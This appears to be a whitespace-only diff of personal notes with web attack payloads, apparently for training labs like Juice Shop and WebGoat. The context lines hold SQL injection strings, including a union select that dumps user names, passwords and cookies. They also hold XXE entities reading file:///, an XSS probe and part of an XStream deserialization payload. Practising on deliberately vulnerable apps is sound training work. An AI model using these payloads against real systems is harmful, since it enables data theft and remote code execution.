@@ -6,7 +6,7 @@ Smith' or '1'='1    - to show exploit; 1=1 can be any true clause
 **Bender Login
 bender@juice-sh.op' --
 
-[2:19 PM]  
+[2:19 PM]
 101
 101 or 1=1
 
@@ -17,7 +17,7 @@ Smith' union select all 1, '2' ,user_name,password, 'MC', cookie, 2 from user_sy
 
 Simple - <?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
 
-Modern Rest Framework - change content type to: Content-Type: application/xml && 
+Modern Rest Framework - change content type to: Content-Type: application/xml &&
 <?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><user>  <username>&root;</username><password>test</password></user>
 
 Blind SendFile ...
@@ -74,7 +74,7 @@ OK<script>alert("XSS")<\/script>
 
 for the deserialization:  got to the link: http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/  to read about why it works so you can talk to it.
 
-<sorted-set>  
+<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
@@ -88,5 +88,3 @@ for the deserialization:  got to the link: http://www.pwntester.com/blog/2013/12
    </handler>
  </dynamic-proxy>
 </sorted-set>
-
-
